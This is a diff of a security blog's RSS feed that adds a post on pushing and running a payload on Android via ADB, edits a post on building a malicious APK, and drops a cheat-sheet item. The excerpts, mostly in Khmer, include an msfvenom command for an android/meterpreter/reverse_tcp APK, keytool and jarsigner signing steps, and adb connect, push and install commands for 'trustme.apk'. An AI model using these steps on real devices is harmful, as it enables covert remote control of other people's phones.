@@ -14,7 +14,7 @@
     <managingEditor>leangputthik@protonmail.com (Thik)</managingEditor>
     <webMaster>leangputthik@protonmail.com (Thik)</webMaster>
     <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2025 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
-    <lastBuildDate>Wed, 21 May 2025 11:00:00 +0700</lastBuildDate>
+    <lastBuildDate>Thu, 05 Jun 2025 13:00:00 +0700</lastBuildDate>
     
         <atom:link href="https://th1k.github.io/en/index.xml" rel="self" type="application/rss+xml" />
     
@@ -42,13 +42,49 @@
 
       
       <item>
+        <title>Android - Install and Run Payload Remotely via ADB</title>
+        <link>https://th1k.github.io/en/posts/android-install-and-run-payload-remotely-via-adb/</link>
+        <pubDate>Thu, 05 Jun 2025 13:00:00 +0700</pubDate>
+        <author>leangputthik@protonmail.com (Thik)</author>
+        <atom:modified>Thu, 05 Jun 2025 13:00:00 +0700</atom:modified>
+        <guid>https://th1k.github.io/en/posts/android-install-and-run-payload-remotely-via-adb/</guid>
+        <description>ភ្ជាប់ម៉ាស៊ីន Android ដោយប្រើប្រាស់ ADB 1 2 3 4 5  //តម្លើងកម្មវិធី ADB sudo apt-get install android-tools-adb //ភ្ជាប់ម៉ាស៊ីន Android adb connect 172.16.xxx.xxx:5555   តម្លើងកម្មវិធីដោយប្រើប្រាស់ ADB 1 2 3 4 5  //បញ្ជូន Payload ចូលទៅក្នុងម៉ាស៊ីន Android adb push C:\trustme.apk /sdcard/0/Download/ //តម្លើង Payload តាមរយៈ ADB adb install trustme.apk (metasploit package payload)   បើកដំណើរការកម្មវិធីដោយប្រើប្រាស់ ADB 1 2 3 4 5 6 7 8 9 10 11 12 13 14  //បើកបង្ហាញកម្មវិធីដែលបានតម្លើង //វានឹងបង្ហាញ Package ដែលបានតម្លើង យើងត្រូវមើលចុងកន្ទុយឈ្មោះនៃកម្មវិធី (com.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>payload</category>
+            
+          
+        
+        
+          
+            
+              <category>ADB</category>
+            
+          
+        
+        
+          
+            
+              <category>Android</category>
+            
+          
+        
+      </item>
+      
+      <item>
         <title>Android H4cking: Creating Malicious APK Payload</title>
         <link>https://th1k.github.io/en/posts/android-h4cking-with-metasploit/</link>
         <pubDate>Wed, 21 May 2025 11:00:00 +0700</pubDate>
         <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Wed, 21 May 2025 11:00:00 +0700</atom:modified>
         <guid>https://th1k.github.io/en/posts/android-h4cking-with-metasploit/</guid>
-        <description>តម្រូវការ  ziplign jarsigner keytool  ប្រើប្រាស់ Metasploit ដើម្បីបង្កើត Android Payload msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.13.X lport=4444 R -o pload.apk  របៀប Sign ឯកសារ APK - បង្កើត Keystore keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000 // បញ្ចូលលេខសំងាត់របស់ RSA និងព័ត៌មានឲ្យបានត្រឹមត្រូវ  របៀប Sign ឯកសារ APK - Sign Payload sudo apt-get install openjdk-21-jdk-headless jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pload.apk Android // បញ្ចូលលេខសំងាត់របស់ RSA ឲ្យបានត្រឹមត្រូវ  របៀប Sign ឯកសារ APK - Verify Payload jarsigner -verify -verbose -certs pload.</description>
+        <description>តម្រូវការ  ziplign jarsigner keytool  ប្រើប្រាស់ Metasploit ដើម្បីបង្កើត Android Payload msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=192.168.13.X lport=4444 R -o pload.apk របៀប Sign ឯកសារ APK - បង្កើត Keystore keytool -genkey -V -keystore key.keystore -alias Android -keyalg RSA -keysize 2048 -validity 10000 // បញ្ចូលលេខសំងាត់របស់ RSA និងព័ត៌មានឲ្យបានត្រឹមត្រូវ របៀប Sign ឯកសារ APK - Sign Payload sudo apt-get install openjdk-21-jdk-headless jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore pload.apk Android // បញ្ចូលលេខសំងាត់របស់ RSA ឲ្យបានត្រឹមត្រូវ របៀប Sign ឯកសារ APK - Verify Payload jarsigner -verify -verbose -certs pload.</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
@@ -80,40 +116,6 @@
           
             
               <category>Android</category>
-            
-          
-        
-      </item>
-      
-      <item>
-        <title>Initial Access: None</title>
-        <link>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</link>
-        <pubDate>Fri, 16 May 2025 13:00:00 +0700</pubDate>
-        <author>leangputthik@protonmail.com (Thik)</author>
-        <atom:modified>Fri, 16 May 2025 13:00:00 +0700</atom:modified>
-        <guid>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</guid>
-        <description>None  PowerShell  1  ./test.bat   </description>
-        
-        <dc:creator>thik</dc:creator>
-        <media:content url="https://th1k.github.ioimages/feature3/terminal.gif" medium="image"><media:title type="html">featured image</media:title></media:content>
-        
-        
-        
-          
-            
-              <category>payload</category>
-            
-          
-        
-        
-          
-            
-              <category>C2</category>
-            
-          
-        
-        
-          
             
           
         
